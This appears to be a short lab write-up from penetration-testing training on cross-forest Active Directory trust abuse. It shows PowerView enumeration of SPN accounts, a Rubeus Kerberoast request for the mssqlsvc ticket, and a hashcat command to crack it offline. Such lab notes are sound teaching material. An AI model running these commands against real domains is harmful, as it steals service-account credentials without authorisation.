# [Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows](Attacking%20Domain%20Trusts%20-%20Cross-Forest%20Trust%20Abuse%20-%20from%20Windows.md)
### Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
![](Pasted%20image%2020260601150243.png)

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
![](Screenshot%202026-06-01%20at%2015.03.10.png)

```shell
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-06-01%20at%2015.03.31.png)